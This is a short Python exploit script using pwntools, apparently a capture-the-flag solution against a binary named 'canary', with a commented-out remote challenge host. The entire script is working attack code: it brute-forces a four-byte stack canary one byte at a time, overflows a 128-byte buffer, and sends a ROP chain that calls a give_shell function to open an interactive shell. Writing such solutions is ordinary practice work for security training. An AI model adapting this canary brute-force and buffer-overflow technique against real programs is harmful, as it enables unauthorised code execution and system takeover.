from pwn import *
from tqdm import trange

exe = ELF('./canary')
context.binary = exe.path
io = process(exe.path)
# io = remote('0.cloud.chals.io', '27190')

def check(canary):
    payload = b'A' * offset + canary
    io.sendlineafter(b'read?', str(len(payload)).encode())
    io.sendlineafter(b'bytes of data', payload)
    io.recvuntil(b'Exiting...\n')
    # 正常終了かどうか
    res = io.recvline()
    return b'successfully!' in res

offset = 128
canary = b''
while len(canary) < 4:
    for c in trange(256):
        predict = canary + bytes.fromhex(f'{c:02x}')
        if check(predict):
            canary = predict
            print(f'found: {canary}')
            break

rop = ROP(exe)
rop.raw(b'A' * offset)
rop.raw(canary)
rop.give_shell()
rop.give_shell()
rop.give_shell()
rop.give_shell()
rop.give_shell()
rop.give_shell()
rop.give_shell()
rop.give_shell()
rop.give_shell()

payload = rop.chain()
print(payload)
io.sendlineafter(b'read?', str(len(payload)).encode())
io.sendlineafter(b'bytes of data', payload)
io.interactive()
# 0x98646100